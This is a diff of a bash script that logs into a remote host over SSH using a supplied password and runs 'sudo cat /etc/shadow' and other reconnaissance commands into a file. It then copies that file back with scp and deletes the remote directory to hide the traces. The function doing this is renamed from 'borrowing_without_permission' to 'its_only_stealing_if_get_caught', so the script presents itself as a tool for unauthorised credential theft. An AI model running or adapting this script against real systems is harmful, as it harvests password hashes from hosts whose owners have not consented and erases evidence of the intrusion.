@@ -22,6 +22,7 @@ LIGHTCYAN='\033[1;36m'
 WHITE='\033[1;37m'
 #-------------------------------------------------------
 
+###################################################################################################################
 #Ensure the script is being ran as root or with sudo privileges
 if [ "$(id -u)" -ne 0 ]; then
 	echo -e "${YELLOW}
@@ -48,6 +49,7 @@ if [ "$(id -u)" -ne 0 ]; then
 	exit 1
 fi
 
+###################################################################################################################
 #To create a directory for the script.
 #This command needs to stay in this location
 HOME=$(pwd)
@@ -57,41 +59,39 @@ if [ $? -gt 0 ]; then
     mkdir $HOME/I_AM_ROOT
 fi
 
-#checking for dependencies
+###################################################################################################################
+#Checking for dependencies
 clear
-echo 'CHECKING DEPENDECIES VERSIONS...'
+echo -e "${GREEN}CHECKING DEPENDECIES VERSIONS....${NOCOLOR}"
 sleep 3 
-echo 'IF DEPENDENCIES NON_EXISTENT, WILL INSTALL.'
+echo -e "${GREEN}IF DEPENDENCIES NON_EXISTENT, WILL INSTALL.${NOCOLOR}"
 sleep 4 
 clear
-sshpass -V 2>/dev/null
+sshpass -v >/dev/null
 if [ $? -gt 0 ]; then
     sudo apt install sshpass -y
 fi
-pv --v 2>/dev/null
+pv --v >/dev/null
 if [ $? -gt 0 ]; then
     sudo apt install pv -y
 fi
-expect -v 2>/dev/null
+expect -v >/dev/null
 if [ $? -gt 0 ]; then
     sudo apt install expect -y
 fi
 
-echo -e "${ORANGE}
+###################################################################################################################
+#Creating Directories
 
-   ____ ____  _____    _  _____ ___ _   _  ____   ____ ___ ____  _____ ____ _____ ___  ______   __
-  / ___|  _ \| ____|  / \|_   _|_ _| \ | |/ ___| |  _ \_ _|  _ \| ____/ ___|_   _/ _ \|  _ \ \ / /
- | |   | |_) |  _|   / _ \ | |  | ||  \| | |  _  | | | | || |_) |  _|| |     | || | | | |_) \ V / 
- | |___|  _ <| |___ / ___ \| |  | || |\  | |_| | | |_| | ||  _ <| |__| |___  | || |_| |  _ < | |  
-  \____|_| \_\_____/_/   \_\_| |___|_| \_|\____| |____/___|_| \_\_____\____| |_| \___/|_| \_\|_|  
-                                                                                                  
-
-${NOCOLOR} " 
+echo -e "${GREEN} CREATING DIRECTORY${NOCOLOR}" 
 sleep 3
 clear
 
+###################################################################################################################
+#Starting Script
+
 sleep 2
-echo -e "${RED}
+echo -e "${GREEN}
                                   wr^^        ^-q__                             
                                _dP                 9m_     
                              _#P                     9#_                         
@@ -149,8 +149,9 @@ printf '\e[0;31m%-6s\e[m' "$(tput bold)
                                                                                
 "
 
-
+###################################################################################################################
 #Function to check IP address is in the proper format
+
 function validateIP(){
     IP_ADDRESS="$1"
     #Check if the format looks rightsdfasdffghdfghfghfg
@@ -160,13 +161,16 @@ function validateIP(){
     return 0
 }
 
-
 echo 
 sleep 2
+
+###################################################################################################################
 #Ask for user input
 printf "${GREEN}ENTER IP ADDRESS: ${NOCOLOR}" 
 read -r IP_ADDRESS
 sleep 1
+
+###################################################################################################################
 # While loop to validate the IP provided, if ip is not valid then it will ask for a valid ip
 while ! validateIP "$IP_ADDRESS"
 do
@@ -185,6 +189,9 @@ printf "${GREEN}ENTER PASSWORD: ${NOCOLOR}"
 read -r PASSWD
 sleep 2
 echo
+
+###################################################################################################################
+#Spin function for show (Need to implement into a process)
 
 SPINVAR1="ATTEMPTING TO CONNECT"
 function progress(){
@@ -208,7 +215,7 @@ function progress(){
         spin1(){
           while [ 1 ]
           do
-              echo -ne "${GREEN}.${NOCOLOR}"
+              echo -ne " ${GREEN}.${NOCOLOR}"
               sleep 0.2
           done  
         }
@@ -216,16 +223,20 @@ function progress(){
 }
 progress
 
-#Function with expect commands to ssh into remote host and execute commands. 
+###################################################################################################################
+# Function with expect commands to ssh into remote host and execute commands. 
 # It will attemp to gather info for possible privilge escalation
 echo
 
+###################################################################################################################
+# Variables
 DIR=/home/$USERNAME/I_AM_ROOT/
 F=Info.txt
 SND="send \"echo '' >> $DIR${F}\r\""
 
-
-function borrowing_without_permission {
+###################################################################################################################
+# Expect function to gather information via ssh
+function its_only_stealing_if_get_caught {
       expect -c "\
       set timeout 300
       set env(TERM)
@@ -263,7 +274,7 @@ function borrowing_without_permission {
       send \"echo '#################### /ETC/SHADOW ####################' >> $DIR${F}\r\"
       ${SND}
       sleep 2
-      send \"cat /etc/shadow >> $DIR${F}\r\"
+      send \"sudo cat /etc/shadow >> $DIR${F}\r\"
       sleep 2
       expect \"*assword*\"
       send \"$PASSWD\r\"
@@ -286,7 +297,10 @@ function borrowing_without_permission {
       send \"exit\r\"
       "
 }
-borrowing_without_permission
+its_only_stealing_if_get_caught
+
+###################################################################################################################
+# Commands to transfer the information and delete DIR in remote host.
 
 sleep 5
 sshpass -p "$PASSWD" scp -r "$USERNAME"@"$IP_ADDRESS":"$DIR" "$HOME"
@@ -295,7 +309,11 @@ sleep 5
 sshpass -p "$PASSWD" ssh "$USERNAME"@"$IP_ADDRESS" rm -r "$DIR"
 sleep 3
 
-# check for contents in the /ETC/SHADOW section of the file
+###################################################################################################################
+### Test phase for parsing information to the terminal### (Fisrt test succesful)
+
+# Check for contents in the /ETC/SHADOW section of the file
+
 grep '/ETC/SHADOW' -A2 I_AM_ROOT/Info.txt | grep 'root'
 #positive result
 if [ $? -eq 0 ]; then
